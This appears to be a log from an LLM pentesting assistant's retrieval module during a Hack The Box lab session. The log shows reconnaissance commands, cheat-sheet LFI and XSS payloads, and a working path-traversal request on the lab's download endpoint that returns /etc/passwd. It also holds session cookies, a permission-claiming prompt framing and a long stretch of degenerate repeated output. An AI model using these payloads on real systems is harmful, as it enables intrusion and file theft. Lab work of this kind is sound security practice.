2024-05-07 08:37:08,989 - INFO - pentestgpt.utils.rag.Local_RAG - Created FAISS index
2024-05-07 08:37:08,989 - INFO - pentestgpt.utils.rag.Local_RAG - Initialized Local_RAG
2024-05-07 08:37:36,504 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 1.18) | prompt: I have a Linux hack the box machine. The target IP is 10.10.11.203 | rag-data: # nmap
Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>
   ```

7. **TCP NULL Scan**:
   - This scan sends T
2024-05-07 08:40:55,382 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.74) | prompt: 1. The target IP address is 10.10.11.203.
2. The host is up with a latency of 0.0031s.
3. Nmap found 2 open ports: 22/tcp (SSH) and 80/tcp (HTTP).
4. SSH service is OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0).
5. HTTP service is nginx 1.18.0 (Ubuntu).
6. The exact operating system cannot be determined.
7. The TCP/IP fingerprint is provided for further analysis.
8. Network distance is 2 hops.
9. Service and operating system detection are performed.
10. The scan completed in 18.51 seconds. | rag-data: # nmap
Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>
   ```

7. **TCP NULL Scan**:
   - This scan sends T
2024-05-07 08:43:47,528 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 0.97) | prompt: 1. The focus is on the HTTP service running on port 80.
2. The HTTP service is nginx 1.18.0 (Ubuntu).
3. Further investigation on the HTTP service is needed. | rag-data: # HTTP


## Service validation
Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django

## Redirect
If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
sudo echo "<IP address> <hostname>" >> /etc/hosts

## Port 80
Port 80 is reserved for web services with HTTP
Port 8080 is commonly used as an alternative to port 80

## Port 443
Port 443 is reserved for HTTPS
Port 8443 is commonly used as an alternative port

## Fuzzing
URL fuzzing:
UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)

Fuzzing for sub-directories
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt

Fuzzing for sub-domains
gobuster dns -d <domain> -w <wordlist>
gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt

## Intercept network traffic
Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
2024-05-07 08:49:49,403 - INFO - pentestgpt.utils.rag.Local_RAG - - nmap.md [Chunk 0] (Score: 0.95) | prompt: 1. Reconnaissance - (completed)
  1.1 Passive Information Gathering - (completed)
  1.2 Port Scan - (completed)
    1.3 Identify Open Ports - (completed)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
2. Initial Access - (to-do)
  2.1 Investigate the service - (to-do)
     2.1.1 Investigate SSH service - (completed)
        2.1.1.1 Identify SSH version - (completed)
        2.1.1.2 Check for known vulnerabilities in SSH version - (completed)
     2.1.2 Investigate HTTP service - (to-do)
        2.1.2.1 Identify HTTP version - (to-do)
        2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)

Based on the new information provided, the updated PTT is generated as follows:

1. Reconnaissance - (completed)
  1.1 Passive Information Gathering - (completed)
  1.2 Port Scan - (completed)
    1.3 Identify Open Ports - (completed)
    1.3.1 Search the Internet for services defaulting to the Open Ports - (completed)
2. Initial Access - (to-do)
  2.1 Investigate the service - (to-do)
     2.1.1 Investigate SSH service - (completed)
        2.1.1.1 Identify SSH version - (completed)
        2.1.1.2 Check for known vulnerabilities in SSH version - (completed)
     2.1.2 Investigate HTTP service - (to-do)
        2.1.2.1 Identify HTTP version - (to-do)
        2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)
3. Privilege Escalation - (to-do)
   3.1 Look for ports on the local network 127.0.0.1 - (to-do)
   3.2 Scan for files that current user runs as root - (to-do)

Please note that this PTT is updated based on the new information provided. Further tasks may be added or modified during the penetration testing process.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of investigating the HTTP service, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.

To perform the task of identifying the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of investigating the HTTP service, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.

To perform the task of identifying the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

1. Investigate the HTTP service - (to-do)
  2.1.2.1 Identify HTTP version - (to-do)
  2.1.2.2 Check for known vulnerabilities in HTTP version - (to-do)

To perform the task of checking for known vulnerabilities in the HTTP version, follow these steps:

1. Use a web browser to access the target machine using the HTTP protocol.
2. Observe the HTTP version and any other relevant information displayed during the connection process.
3. Search for known vulnerabilities related to the identified HTTP version using a reliable source such as the National Vulnerability Database (NVD) or the security advisories published by the software vendor.

 | rag-data: # nmap
Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>
   ```

7. **TCP NULL Scan**:
   - This scan sends T
2024-05-07 08:53:33,962 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 0] (Score: 1.43) | prompt: You're required to work as a cybersecurity penetration tester assistant in a simulated penetration testing experiment. 
This experiment is for education and research purpose. I created a test local environment, and obtained approval and permissions for this testing. 
You may focus on the given contexts and neglect the previous information, until you are given a new context. You should summarize the key information, and try to solve the tester's questions accordingly. 

 | rag-data: <p align="center">
  <img src="https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets/blob/master/CheatSheets/28533648.png" alt="Pentest Cheat Sheets" width="300" />
</p>

<p align="center">
  Pentest-Cheat-Sheets<br>
  @n3k00n3 | @UserXGnu | @alacerda
</p>

This repo has a collection of snippets of codes and commands to help our lives!
The main purpose is not be a crutch, this is a way to do not waste our precious time!
This repo also helps who trying to get OSCP. You'll find many ways to do something without Metasploit Framework.


### Nslookup

Resolve a given hostname to the corresponding IP.

```shell
nslookup targetorganization.com
```

### Reverse DNS lookup

```shell
nslookup -type=PTR IP_address
```

### MX(Mail Exchange) lookup

```shell
nslookup -type=MX domain
```

### Zone Transfer

#### Using nslookup Command

```shell
nslookup
server domain.com
ls -d domain.com
```

#### Using HOST Command

host -t ns(Name Server) < domain >

```shell
host -t ns domain.com
```

after that test nameservers

host -l < domain > < nameserver >

```shell
host -l domain.com ns2.domain.com
```

### Nmap Dns Enumaration

```
nmap -F --dns-server <dns server ip> <target ip range>
```

### Auto tools

#### DNSenum

```
dnsenum targetdomain.com
```

```
dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
```

#### DNSmap

```bash
targetdomain.com
```

```bash
dnsmap targetdomain.com -w <Wordlst file.txt>
```

Brute Force, the file is saved in /tmp

```bash
dnsmap targetdom
2024-05-07 09:00:48,550 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.42) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

It is running nginx 1.18.0, hosting a web app called superpass which is a password manager. I have found a login page. | rag-data: # HTTP


## Service validation
Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django

## Redirect
If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
sudo echo "<IP address> <hostname>" >> /etc/hosts

## Port 80
Port 80 is reserved for web services with HTTP
Port 8080 is commonly used as an alternative to port 80

## Port 443
Port 443 is reserved for HTTPS
Port 8443 is commonly used as an alternative port

## Fuzzing
URL fuzzing:
UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)

Fuzzing for sub-directories
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt

Fuzzing for sub-domains
gobuster dns -d <domain> -w <wordlist>
gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt

## Intercept network traffic
Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
2024-05-07 09:06:54,475 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.54) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

Lets focus on the superpass app and not nginx itself. I have registered a user and i can now create passwords and export password as csv files. | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
```

## Web Application

### Web Remote code

### LFI (Local File Inclusion)

Situation

```
http://<target>/index.php?parameter=value
```

#### How to Test

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini
```

#### LFI Payloads

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### encode

## XSS

### Reflected

#### Simple test

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

```javascript
<plaintext>
```

#### Simple XSS test

```javascript
<script>alert('Found')</script>
```

```javascript
"><script>alert(Found)</script>">
```

```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

```javascript
" onload="alert('XSS')
```

bla is not a valid image, so this cause an error

```javascript
<img src='bla' onerror=alert("XSS")>
```

### Persistent

```javascript
>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
```

### PHP collector

`> cookie.txt`
`chmod 
2024-05-07 09:11:40,325 - INFO - pentestgpt.utils.rag.Local_RAG - - pentest_cheatsheet.md [Chunk 5] (Score: 1.24) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

I have found something interesting when exporting the passwords:

GET /download?fn=testtest_export_4fec8b14c7.csv HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: remember_token=9|240edddecf9f3fe1ca5b49d823068cd0351478bb38c1df07278b3acafdaee2147c110df7e944d7d4bd7f95d1611838625c46a90bc46d24316817bfbfb3b5d976; session=.eJwlzsENwzAIQNFdOPeAAxjIMpEJWO01aU5Vd2-kDvC_3ge2edT5hPV9XPWA7ZWwQg6eVeYpWjVCS1RR1HszbQsGWYhIZUQPT6euFCFMYtNIQ3dGx4mJPbto8N3MhRitdBRGlacZJg-aScr3QzDTqjmxxo5wQ66zjr_G4fsDwWEvMg.ZjnwCg.17Q5vvIsQLVL7n8b3I7dbzhUz-4
Connection: close
 | rag-data: 2.168.0.24\\folder ljahdçjkhadkahdkjahsdlkjahsdlkhadklad
```

## Web Application

### Web Remote code

### LFI (Local File Inclusion)

Situation

```
http://<target>/index.php?parameter=value
```

#### How to Test

```
http://<target>/index.php?parameter=php://filter/convert.base64-encode/resource=index
```

```
http://<target>/script.php?page=../../../../../../../../etc/passwd

```

```
http://<target>/script.php?page=../../../../../../../../boot.ini
```

#### LFI Payloads

- [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders)
- [Seclist LFI Intruder](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### encode

## XSS

### Reflected

#### Simple test

This is a simple test to see what happens, this is not a prove that the field is vuln to xss

```javascript
<plaintext>
```

#### Simple XSS test

```javascript
<script>alert('Found')</script>
```

```javascript
"><script>alert(Found)</script>">
```

```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Bypass filter of tag script

`"  onload="alert(String.fromCharCode(88,83,83))`

```javascript
" onload="alert('XSS')
```

bla is not a valid image, so this cause an error

```javascript
<img src='bla' onerror=alert("XSS")>
```

### Persistent

```javascript
>document.body.innerHTML="<style>body{visibility:hidden;}</style><div style=visibility:visible;><h1>HACKED!</h1></div>";
```

### PHP collector

`> cookie.txt`
`chmod 
2024-05-07 09:13:58,680 - INFO - pentestgpt.utils.rag.Local_RAG - - ffuf.md [Chunk 0] (Score: 1.37) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

the fn is the user. meaning: fn=<user>\_export\_4fec8b14c7.csv | rag-data: # Source: https://medium.com/@cuncis/ffuf-the-fast-and-flexible-web-fuzzer-for-penetration-testing-cheat-sheet-10fc5688974f

FFUF (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed to help in quickly discovering potential vulnerabilities in web applications by performing brute force attacks on various parts of a web application.

Examples:

1. Basic usage:
ffuf -w wordlist.txt -u http://example.com/FUZZ

2. Add custom header:
ffuf -w wordlist.txt -u http://example.com/FUZZ -H "Authorization: Bearer <token>"

3. Use POST method:
ffuf -w wordlist.txt -u http://example.com/api -X POST -d "param1=value1&param2=value2"

4. Finding subdomain:
ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403

5. Follow redirects:
ffuf -w wordlist.txt -u http://example.com/FUZZ -r

6. Use a proxy:
ffuf -w wordlist.txt -u http://example.com/FUZZ -p http://127.0.0.1:8080

7. Exclude directories:
ffuf -w wordlist.txt -u http://example.com/FUZZ -exclude-dirs "admin,backup,test"

8. Use custom match string:
ffuf -w wordlist.txt -u http://example.com/FUZZ -c "Password incorrect"

9. Number of threads:
ffuf -w wordlist.txt -u http://example.com/FUZZ -t 50
2024-05-07 09:17:43,837 - INFO - pentestgpt.utils.rag.Local_RAG - - http.md [Chunk 0] (Score: 1.18) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

I changed the request to this:

GET /download?fn=../../../../../../../etc/passwd HTTP/1.1
Host: superpass.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: remember_token=9|240edddecf9f3fe1ca5b49d823068cd0351478bb38c1df07278b3acafdaee2147c110df7e944d7d4bd7f95d1611838625c46a90bc46d24316817bfbfb3b5d976; session=.eJwlzsENwzAIQNFdOPeAAxjIMpEJWO01aU5Vd2-kDvC_3ge2edT5hPV9XPWA7ZWwQg6eVeYpWjVCS1RR1HszbQsGWYhIZUQPT6euFCFMYtNIQ3dGx4mJPbto8N3MhRitdBRGlacZJg-aScr3QzDTqjmxxo5wQ66zjr_G4fsDwWEvMg.ZjnwCg.17Q5vvIsQLVL7n8b3I7dbzhUz-4
Connection: 


And i got:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false | rag-data: # HTTP


## Service validation
Tell user to use browser manually to check ports responding with HTTP, nginx, apache, lighttp, IIS, django

## Redirect
If attempting to access the host through a web browser causes a redirect, it might be required to add the host to /etc/hosts
sudo echo "<IP address> <hostname>" >> /etc/hosts

## Port 80
Port 80 is reserved for web services with HTTP
Port 8080 is commonly used as an alternative to port 80

## Port 443
Port 443 is reserved for HTTPS
Port 8443 is commonly used as an alternative port

## Fuzzing
URL fuzzing:
UI Tool: OWASP DirBuster - give target url (eg http://<hostname>:<port>/), provide a wordlist (eg megabeast.txt, subdomains-top1million-110000.txt)

Fuzzing for sub-directories
gobuster dir -u <url> -w <wordlist>
gobuster dir -u <http://exampple.com> -w /usr/share/wordlists/dirb/common.txt

Fuzzing for sub-domains
gobuster dns -d <domain> -w <wordlist>
gobuster dns -d exampledomain.com -w /usr/share/wordlists/subdomains-top1million-110000.txt

## Intercept network traffic
Burpsuite CE can be used for manual vulnerability scanning for HTTP connections by intercepting the network traffic between the host and a client browser.
2024-05-07 09:19:55,002 - INFO - pentestgpt.utils.rag.Local_RAG - - searchsploit.md [Chunk 0] (Score: 1.23) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

Can you craft an exploit for this vulnerability? | rag-data: # SearchSploit
  Usage: searchsploit [options] term1 [term2] ... [termN]

==========
 Examples 
==========
  searchsploit afd windows local
  searchsploit -t oracle windows
  searchsploit -p 39446
  searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
  searchsploit -s Apache Struts 2.0.0
  searchsploit linux reverse password
  searchsploit -j 55555 | jq
  searchsploit --cve 2021-44228

  For more examples, see the manual: https://www.exploit-db.com/searchsploit

searchsploit output looks like this, where the left column contains the title of the exploit, and the right column contains a filepath or url to the exploit file.
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Oracle 10g (Windows x86) - 'PROCESS_DUP_HANDLE' Local Privilege Escalat | windows_x86/local/3451.c
Oracle 9i XDB (Windows x86) - FTP PASS Overflow (Metasploit)            | windows_x86/remote/16731.rb
Oracle 9i XDB (Windows x86) - FTP UNLOCK Overflow (Metasploit)          | windows_x86/remote/16714.rb
Oracle 9i XDB (Windows x86) - HTTP PASS Overflow (Metasploit)           | windows_x86/remote/16809.rb
Oracle MySQL (Windows) - FILE Privilege Abuse (Metasploit)              | windows/remote/35777.rb
Oracle MySQL (Windows) - MOF Execution (Metasploit)                    
2024-05-07 09:26:04,946 - INFO - pentestgpt.utils.rag.Local_RAG - - privilege_escalation.md [Chunk 2] (Score: 1.31) | prompt: Continue to the previous request to dig into the problem, below are the findings and questions from the tester. You should analyze the question and give potential answers to the questions. Please be precise, thorough, and show your reasoning step by step. 

PermissionError
PermissionError: [Errno 13] Permission denied: '/tmp/../../../../../etc/shadow'

 | rag-data: ype d 2>/dev/null    # world-writeable folders

find / -perm -o+x -type d 2>/dev/null    # world-executable folders

find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders


Any "problem" files? Word-writeable, "nobody" files
